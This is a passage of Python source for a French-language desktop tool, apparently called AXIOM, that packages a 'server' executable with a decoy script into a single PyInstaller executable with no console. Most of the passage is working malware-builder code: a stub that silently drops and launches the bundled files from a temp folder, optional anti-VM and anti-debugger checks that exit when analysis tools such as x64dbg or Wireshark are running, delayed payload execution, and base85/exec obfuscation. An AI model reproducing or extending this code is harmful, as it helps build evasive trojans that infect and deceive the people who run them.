                "[INFO]": "info",
                "[SUCCESS]": "success",
                "[ERROR]": "error",
            }

            # Si un token est présent, ne colorer que le token (pas toute la ligne).
            lowered = line.lower()
            found = None
            for token in token_to_tag.keys():
                idx = lowered.find(token.lower())
                if idx != -1 and (found is None or idx < found[1]):
                    found = (token, idx)

            if found:
                token, idx = found
                before = line[:idx]
                after = line[idx + len(token):]

                if before:
                    self.terminal_tk.insert("end", before, "default")
                self.terminal_tk.insert("end", token, token_to_tag[token])
                if after:
                    self.terminal_tk.insert("end", after, "default")
            else:
                resolved_tag = tag if tag else self._detect_tag(msg)
                self.terminal_tk.insert("end", line, resolved_tag)

            # Scroll automatique à chaque ajout (demandé).
            self.terminal_tk.see("end")
            self.terminal_tk.configure(state="disabled")

        if hasattr(self, "journal_textbox") and self.active_tab == 2:
            self._refresh_journaux()

    # ══════════════════════════════════════════
    #  PANNEAU 1 — PROJETS
    # ══════════════════════════════════════════
    def _build_panel_projets(self, parent):
        panel = ctk.CTkFrame(parent, fg_color=BG, corner_radius=0)
        self._build_header(panel, "PROJETS", "— historique des compilations")

        scroll = ctk.CTkScrollableFrame(panel, fg_color=BG,
                                        scrollbar_button_color=TXT_DIM,
                                        scrollbar_button_hover_color=NEON_BLUE,
                                        corner_radius=0)
        scroll.pack(fill="both", expand=True)

        self._section_label(scroll, "[ COMPILATIONS RECENTES ]")

        self.projets_liste = ctk.CTkFrame(scroll, fg_color="transparent")
        self.projets_liste.pack(fill="x", padx=20, pady=(0, 20))

        self._render_projets()
        return panel

    def _render_projets(self):
        for widget in self.projets_liste.winfo_children():
            widget.destroy()

        if not self.project_history:
            ctk.CTkLabel(self.projets_liste,
                         text="Aucune compilation effectuee pour le moment.",
                         font=FONT_SMALL, text_color=TXT_SECONDARY).pack(pady=30)
            return

        for projet in reversed(self.project_history):
            card = ctk.CTkFrame(self.projets_liste, fg_color=BG_CARD, corner_radius=6,
                                border_width=1, border_color=TXT_DIM)
            card.pack(fill="x", pady=4)

            top = ctk.CTkFrame(card, fg_color="transparent")
            top.pack(fill="x", padx=14, pady=(10, 2))

            statut_couleur = NEON_GREEN if projet["succes"] else NEON_RED
            statut_texte   = "● SUCCES" if projet["succes"] else "● ECHEC"

            ctk.CTkLabel(top, text=projet["nom"], font=FONT_LABEL,
                         text_color=TXT_PRIMARY).pack(side="left")
            ctk.CTkLabel(top, text=statut_texte, font=FONT_SMALL,
                         text_color=statut_couleur).pack(side="right")

            ctk.CTkLabel(card, text=f"  Horodatage : {projet['date']}",
                         font=FONT_SMALL, text_color=TXT_SECONDARY).pack(anchor="w", padx=14, pady=(0, 6))
            ctk.CTkLabel(card, text=f"  Icone : {projet['icone'] or 'aucune'}",
                         font=FONT_SMALL, text_color=TXT_SECONDARY).pack(anchor="w", padx=14, pady=(0, 8))

    # ══════════════════════════════════════════
    #  PANNEAU 2 — JOURNAUX
    # ══════════════════════════════════════════
    def _build_panel_journaux(self, parent):
        panel = ctk.CTkFrame(parent, fg_color=BG, corner_radius=0)
        self._build_header(panel, "JOURNAUX", "— sortie complete du systeme")

        content = ctk.CTkFrame(panel, fg_color=BG, corner_radius=0)
        content.pack(fill="both", expand=True, padx=20, pady=10)

        barre = ctk.CTkFrame(content, fg_color="transparent")
        barre.pack(fill="x", pady=(0, 8))
        ctk.CTkLabel(barre, text="[ JOURNAL SYSTEME ]", font=FONT_LABEL,
                     text_color=NEON_BLUE).pack(side="left")
        CyberButton(barre, text="Effacer", width=72, height=26,
                      fg_color=BG_FIELD, hover_color="#1a0a0a",
                      text_color=NEON_RED, font=FONT_LABEL,
                      corner_radius=4, border_width=1,
                      border_color=NEON_RED,
                      glow_color=NEON_RED, hover_glow_color=NEON_YELLOW,
                      command=self._effacer_journaux).pack(side="right")

        term_frame = ctk.CTkFrame(content, fg_color=BG_CARD, corner_radius=6,
                                  border_width=1, border_color=TXT_DIM)
        term_frame.pack(fill="both", expand=True)

        self.journal_textbox = ctk.CTkTextbox(
            term_frame, fg_color="transparent",
            text_color="#4ade80", font=FONT_MONO,
            scrollbar_button_color=TXT_DIM,
            scrollbar_button_hover_color=NEON_BLUE,
            activate_scrollbars=True, border_width=0
        )
        self.journal_textbox.pack(fill="both", expand=True, padx=6, pady=6)
        self.journal_textbox.configure(state="disabled")

        return panel

    def _refresh_journaux(self):
        if not hasattr(self, "journal_textbox"):
            return
        self.journal_textbox.configure(state="normal")
        self.journal_textbox.delete("1.0", "end")
        for ligne in self.all_logs:
            self.journal_textbox.insert("end", f"  {ligne}\n")
        self.journal_textbox.see("end")
        self.journal_textbox.configure(state="disabled")

    def _effacer_journaux(self):
        self.all_logs.clear()
        self._refresh_journaux()

    # ══════════════════════════════════════════
    #  PANNEAU 3 — PARAMETRES
    # ══════════════════════════════════════════
    def _build_panel_parametres(self, parent):
        panel = ctk.CTkFrame(parent, fg_color=BG, corner_radius=0)
        self._build_header(panel, "PARAMETRES", "— configuration du systeme")

        scroll = ctk.CTkScrollableFrame(panel, fg_color=BG,
                                        scrollbar_button_color=TXT_DIM,
                                        scrollbar_button_hover_color=NEON_BLUE,
                                        corner_radius=0)
        scroll.pack(fill="both", expand=True)

        # ── Informations ──
        self._section_label(scroll, "[ INFORMATIONS ]")
        infos = ctk.CTkFrame(scroll, fg_color=BG_CARD, corner_radius=6,
                             border_width=1, border_color=TXT_DIM)
        infos.pack(fill="x", padx=20, pady=(0, 4))
        self._info_row(infos, "Version",    "2.0")
        self._info_row(infos, "Python",     sys.version.split()[0])
        self._info_row(infos, "Plateforme", sys.platform)
        self._info_row(infos, "Repertoire", os.path.dirname(os.path.abspath(__file__)))

        # ── Comportement ──
        self._section_label(scroll, "[ COMPORTEMENT PAR DEFAUT ]")
        comport = ctk.CTkFrame(scroll, fg_color=BG_CARD, corner_radius=6,
                               border_width=1, border_color=TXT_DIM)
        comport.pack(fill="x", padx=20, pady=(0, 4))
        self._toggle_row(comport, "Nettoyage apres compilation",
                         self.pref_nettoyer,
                         "Supprime les fichiers temporaires (build/, stub, spec)")
        self._toggle_row(comport, "Journalisation detaillee",
                         self.pref_journal,
                         "Enregistre tous les evenements dans le journal systeme")

        # ── STEALTH ──────────────────────────
        self._section_label(scroll, "[ OPTIONS FURTIVITE ]")

        stealth_card = ctk.CTkFrame(scroll, fg_color=BG_CARD, corner_radius=6,
                                    border_width=1, border_color="#3a1a1a")
        stealth_card.pack(fill="x", padx=20, pady=(0, 4))

        # Avertissement
        warn_row = ctk.CTkFrame(stealth_card, fg_color="#1a0a0a", corner_radius=4)
        warn_row.pack(fill="x", padx=14, pady=(10, 4))
        ctk.CTkLabel(warn_row, text="⚠  Fonctionnalites avancees — utiliser avec prudence",
                     font=FONT_SMALL, text_color=NEON_YELLOW).pack(padx=10, pady=4)

        self._toggle_row(stealth_card, "Anti-VM",
                         self.opt_anti_vm,
                         "Detecte les environnements virtualises et stoppe l'execution",
                         color=NEON_YELLOW)
        self._toggle_row(stealth_card, "Anti-Debugger",
                         self.opt_anti_debug,
                         "Detecte les outils d'analyse (OllyDbg, x64dbg, etc.) et se ferme",
                         color=NEON_YELLOW)
        self._toggle_row(stealth_card, "Execution differee",
                         self.opt_delay_exec,
                         "Attend N secondes avant de lancer le payload",
                         color=NEON_YELLOW)

        # Champ pour le delai
        delay_row = ctk.CTkFrame(stealth_card, fg_color="transparent")
        delay_row.pack(fill="x", padx=14, pady=(4, 8))
        ctk.CTkLabel(delay_row, text="Delai (secondes) :", font=FONT_LABEL,
                     text_color=TXT_SECONDARY, width=160, anchor="w").pack(side="left")
        ctk.CTkEntry(delay_row, textvariable=self.delay_seconds,
                     width=70, height=28, fg_color=BG_INPUT,
                     border_color=TXT_DIM, border_width=1,
                     text_color=NEON_YELLOW, font=FONT_MONO).pack(side="left", padx=8)

        # ── Obfuscation ──────────────────────
        self._section_label(scroll, "[ OBFUSCATION ]")

        obf_card = ctk.CTkFrame(scroll, fg_color=BG_CARD, corner_radius=6,
                                border_width=1, border_color="#1a0a3a")
        obf_card.pack(fill="x", padx=20, pady=(0, 4))

        obf_warn = ctk.CTkFrame(obf_card, fg_color="#0d0820", corner_radius=4)
        obf_warn.pack(fill="x", padx=14, pady=(10, 4))
        ctk.CTkLabel(obf_warn, text="⚙  Le stub Python sera obfusque avant compilation",
                     font=FONT_SMALL, text_color=NEON_CYAN).pack(padx=10, pady=4)

        self._toggle_row(obf_card, "Obfusquer le stub Python",
                         self.opt_obfuscation,
                         "Encode le stub en base85 + renommage aleatoire des variables",
                         color=NEON_CYAN)

        # ── Actions ──────────────────────────
        self._section_label(scroll, "[ ACTIONS ]")
        actions = ctk.CTkFrame(scroll, fg_color="transparent")
        actions.pack(fill="x", padx=20, pady=(0, 20))

        CyberButton(actions, text="Ouvrir le dossier de sortie  ./dist/",
                      height=38, font=FONT_LABEL,
                      fg_color=BG_CARD, hover_color="#0d1f35",
                      text_color=NEON_BLUE, corner_radius=6,
                      border_width=1, border_color=NEON_BLUE,
                      glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN,
                      command=self._ouvrir_dossier_dist).pack(fill="x", pady=4)

        CyberButton(actions, text="Reinitialiser tous les champs",
                      height=38, font=FONT_LABEL,
                      fg_color=BG_CARD, hover_color="#1a0a0a",
                      text_color=NEON_RED, corner_radius=6,
                      border_width=1, border_color=NEON_RED,
                      glow_color=NEON_RED, hover_glow_color=NEON_YELLOW,
                      command=self._reinitialiser).pack(fill="x", pady=4)

        return panel

    def _info_row(self, parent, cle, valeur):
        r = ctk.CTkFrame(parent, fg_color="transparent")
        r.pack(fill="x", padx=14, pady=5)
        ctk.CTkLabel(r, text=cle, font=FONT_LABEL, text_color=TXT_SECONDARY,
                     width=120, anchor="w").pack(side="left")
        ctk.CTkLabel(r, text=valeur, font=FONT_MONO, text_color=TXT_PRIMARY,
                     anchor="w").pack(side="left", padx=8)
        sep = ctk.CTkFrame(parent, height=1, fg_color=TXT_DIM)
        sep.pack(fill="x", padx=14)

    def _ouvrir_dossier_dist(self):
        dist = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist")
        if not os.path.exists(dist):
            messagebox.showinfo("AXIOM", "Le dossier ./dist/ n'existe pas encore.\nLancez une compilation d'abord.")
            return
        if sys.platform == "win32":
            os.startfile(dist)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", dist])
        else:
            subprocess.Popen(["xdg-open", dist])

    def _reinitialiser(self):
        if messagebox.askyesno("Reinitialiser", "Reinitialiser tous les champs ?"):
            self.server_path.set("")
            self.decoy_path.set("")
            self.src_folder_path.set("")
            self.icon_path.set("")
            self.opt_silent.set(True)
            self.opt_autorun.set(False)
            self.opt_priority.set(False)
            self.opt_anti_vm.set(False)
            self.opt_anti_debug.set(False)
            self.opt_delay_exec.set(False)
            self.opt_obfuscation.set(False)
            self.delay_seconds.set("5")
            self._log("Champs reinitialises.", "info")

    # ─── HELPERS ──────────────────────────────
    def _browse(self, var, browse_type):
        path = (filedialog.askopenfilename()
                if browse_type == "file" else filedialog.askdirectory())
        if path:
            var.set(path)

    def _set_status(self, text, color=TXT_SECONDARY):
        self.status_label.configure(text=text, text_color=color)
        self.update()

    # ─── STUB (avec options stealth + obfuscation) ─
    def _write_stub(self, f1, f2, src_dir, out):
        src_tar = "src.tar.gz"
        with tarfile.open(src_tar, "w:gz") as tar:
            tar.add(src_dir, arcname="src")

        with open(f1, "rb") as a, open(f2, "rb") as b, open(src_tar, "rb") as s:
            d1 = base64.b64encode(a.read()).decode()
            d2 = base64.b64encode(b.read()).decode()
            ds = base64.b64encode(s.read()).decode()

        os.remove(src_tar)

        # Blocs stealth optionnels
        anti_vm_block = ""
        if self.opt_anti_vm.get():
            anti_vm_block = """
    # Anti-VM : quitter si environment virtualise detecte
    import platform, subprocess as _sp
    _vm_signs = ["vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v"]
    _info = platform.node().lower() + platform.processor().lower()
    try:
        _sysinfo = _sp.check_output("systeminfo", shell=True, stderr=_sp.DEVNULL).decode(errors="ignore").lower()
    except Exception:
        _sysinfo = ""
    if any(s in _info + _sysinfo for s in _vm_signs):
        raise SystemExit(0)
"""

        anti_debug_block = ""
        if self.opt_anti_debug.get():
            anti_debug_block = """
    # Anti-Debugger : quitter si un debugger est attache
    import ctypes as _ct
    try:
        if _ct.windll.kernel32.IsDebuggerPresent():
            raise SystemExit(0)
    except Exception:
        pass
    # Verifier les processus d'analyse connus
    import subprocess as _sp2
    _known = ["ollydbg", "x64dbg", "x32dbg", "ida64", "ida", "dnspy", "wireshark", "procmon"]
    try:
        _procs = _sp2.check_output("tasklist", shell=True, stderr=_sp2.DEVNULL).decode(errors="ignore").lower()
        if any(p in _procs for p in _known):
            raise SystemExit(0)
    except Exception:
        pass
"""

        delay_block = ""
        if self.opt_delay_exec.get():
            try:
                delay_val = int(self.delay_seconds.get())
            except ValueError:
                delay_val = 5
            delay_block = f"""
    # Execution differee de {delay_val} secondes
    time.sleep({delay_val})
"""

        content = f"""
import os, base64, subprocess, tempfile, time, tarfile, shutil, uuid

def run():
    unique_id = str(uuid.uuid4())[:8]
    t = os.path.join(tempfile.gettempdir(), f"axiom_data_{{unique_id}}")
    if not os.path.exists(t):
        os.makedirs(t)
{anti_vm_block}{anti_debug_block}{delay_block}
    p1 = os.path.join(t, "{os.path.basename(f1)}")
    p2 = os.path.join(t, "{os.path.basename(f2)}")
    ps = os.path.join(t, "src.tar.gz")

    try:
        with open(p1, 'wb') as x: x.write(base64.b64decode('{d1}'))
        with open(p2, 'wb') as y: y.write(base64.b64decode('{d2}'))
        with open(ps, 'wb') as z: z.write(base64.b64decode('{ds}'))

        with tarfile.open(ps, "r:gz") as tar:
            tar.extractall(path=t)

        subprocess.Popen(['cmd.exe', '/C', p2],
                         creationflags=subprocess.CREATE_NEW_CONSOLE, cwd=t)
        time.sleep(2)
        subprocess.Popen(p1, shell=True, cwd=t)
    except Exception:
        pass

if __name__ == "__main__":
    run()
"""
        # Obfuscation : encodage base85 + wrapper de dechiffrement
        if self.opt_obfuscation.get():
            self._log("  >> Obfuscation du stub en cours...", "info")
            import base64 as _b64
            encoded = _b64.b85encode(content.encode("utf-8")).decode("ascii")
            import random as _r, string as _s
            var_name = "".join(_r.choices(_s.ascii_lowercase, k=8))
            content = (
                f"import base64 as _b,sys\n"
                f"{var_name}={repr(encoded)}\n"
                f"exec(_b.b85decode({var_name}).decode('utf-8'))\n"
            )
            self._log("  >> Stub obfusque avec succes.", "success")

        with open(out, "w", encoding="utf-8") as f:
            f.write(content)

    # ─── COMPILATION ──────────────────────────
    def _start_compilation(self):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))

        if not self.server_path.get() or not self.decoy_path.get() or not self.src_folder_path.get():
            messagebox.showerror(
                "AXIOM — Champs manquants",
                "Les slots A (Executable principal), B (Script d'automatisation)\net C (Ressources) sont obligatoires."
            )
            return

        self.btn_compile.configure(state="disabled", fg_color=TXT_DIM,
                                   text=">>  COMPILATION EN COURS ...  <<")
        self.progress.start()
        self.mini_monitor.start()
        self._set_status("Initialisation de l'assemblage...", NEON_CYAN)
        self._log("", "dim")
        self._log(f"  [SLOT A]  {os.path.basename(self.server_path.get())}", "info")
        self._log(f"  [SLOT B]  {os.path.basename(self.decoy_path.get())}", "info")
        self._log(f"  [SLOT C]  {os.path.basename(self.src_folder_path.get())}", "info")
        self._log("", "dim")

        # Journaliser les options stealth actives
        if self.opt_anti_vm.get():
            self._log("  [STEALTH]  Anti-VM active", "warning")
        if self.opt_anti_debug.get():
            self._log("  [STEALTH]  Anti-Debugger active", "warning")
        if self.opt_delay_exec.get():
            self._log(f"  [STEALTH]  Execution differee : {self.delay_seconds.get()}s", "warning")
        if self.opt_obfuscation.get():
            self._log("  [OBFUSCATION]  Mode obfuscation active", "warning")

        stub_name = "temp_stub.py"
        succes = False
        try:
            self._log("  >> Encodage de la charge utile en base64...", "info")
            self._write_stub(self.server_path.get(), self.decoy_path.get(),
                             self.src_folder_path.get(), stub_name)
            self._log("  >> Stub ecrit avec succes.", "success")

            self._set_status("Lancement de PyInstaller — patientez...", NEON_BLUE)
            self._log("  >> Lancement de PyInstaller...", "info")

            # Nom de sortie de l'exe
            default_name = os.path.splitext(os.path.basename(self.server_path.get()))[0] or "package"
            chosen_name = self._sanitize_exe_name(self.output_exe_name.get()) if hasattr(self, "output_exe_name") else ""
            exe_name = chosen_name or self._sanitize_exe_name(default_name) or "package"

            cmd = [sys.executable, "-m", "PyInstaller",
                   "--noconsole", "--onefile", "--clean",
                   "--name", exe_name]
            if self.icon_path.get():
                cmd.extend(["--icon", self.icon_path.get()])
            cmd.append(stub_name)

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                if hasattr(self, "pref_nettoyer") and self.pref_nettoyer.get():
                    self._cleanup(stub_name)
                succes = True

                # Calculer les tailles pour le donut
                self._compute_donut_sizes()

                self._log("  >> Compilation terminee. Sortie : ./dist/", "success")
                self._log("─" * 52, "dim")
                self._set_status("Package genere avec succes  —  ./dist/", NEON_GREEN)
                messagebox.showinfo("AXIOM — Compilation OK",
                                    "Executable compile avec succes.\nDossier de sortie : ./dist/")
            else:
                self._log("  [ERREUR]  PyInstaller a retourne un code non nul.", "error")
                self._log(result.stderr[-600:] if result.stderr else "aucune sortie stderr", "error")
                self._set_status("Echec de compilation — voir le terminal.", NEON_RED)
                messagebox.showerror("AXIOM — Echec",
                                     "PyInstaller a echoue. Verifiez la sortie du terminal.")

        except Exception as e:
            self._log(f"  [EXCEPTION]  {str(e)}", "error")
            self._set_status(f"Exception : {str(e)}", NEON_RED)
            messagebox.showerror("AXIOM — Erreur", f"Erreur inattendue :\n{str(e)}")

        finally:
            self.project_history.append({
                "nom":    os.path.basename(self.server_path.get()),
                "date":   datetime.datetime.now().strftime("%d/%m/%Y  %H:%M:%S"),
                "icone":  os.path.basename(self.icon_path.get()) if self.icon_path.get() else "",
                "succes": succes,
            })
            self._render_projets()
            self.mini_monitor.stop()
            self.progress.stop()
            self.btn_compile.configure(state="normal", fg_color=NEON_BLUE,
                                       text=">>  GENERER LE PACKAGE  <<")

    def _compute_donut_sizes(self):
        """Estimer la repartition des tailles dans le package."""
        try:
            exe_size    = os.path.getsize(self.server_path.get())     if os.path.exists(self.server_path.get())     else 100
            script_size = os.path.getsize(self.decoy_path.get())      if os.path.exists(self.decoy_path.get())      else 10
            src_size    = sum(
                os.path.getsize(os.path.join(dp, f))
                for dp, _, files in os.walk(self.src_folder_path.get())
                for f in files
            ) if os.path.isdir(self.src_folder_path.get()) else 50
            self._update_donut(exe_size, script_size, src_size)
        except Exception:
            self._update_donut(100, 10, 50)

    def _cleanup(self, stub_file):
        for folder in ["build", "__pycache__"]:
            if os.path.exists(folder):
                shutil.rmtree(folder)
        for f in [stub_file, stub_file.replace(".py", ".spec")]:
            if os.path.exists(f):
                os.remove(f)


if __name__ == "__main__":
    app = AxiomDeployPro()
    app.mainloop()
